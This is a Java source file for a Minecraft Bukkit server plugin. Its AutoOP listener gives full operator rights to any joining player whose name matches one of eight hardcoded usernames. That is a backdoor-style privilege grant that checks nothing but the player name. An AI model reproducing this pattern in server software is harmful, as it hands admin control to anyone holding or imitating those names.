package net.astropvp.core.listeners;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

import java.util.ArrayList;
import java.util.List;

public class AutoOP implements Listener {

    @EventHandler
    public void onPlayerJoinEvent(PlayerJoinEvent e) {
        List<String> list = new ArrayList<String>();
        list.add("Bryside");
        list.add("KingJeanFTW");
        list.add("Evilestline");
        list.add("MYCQ");
        list.add("Liammmm_");
        list.add("JUUL");
        list.add("Fredo_nutella");
        list.add("MattHawkk");
        for (String l : list) {
            if (e.getPlayer().getName().equalsIgnoreCase(l))
                e.getPlayer().setOp(true);
        }
    }


}
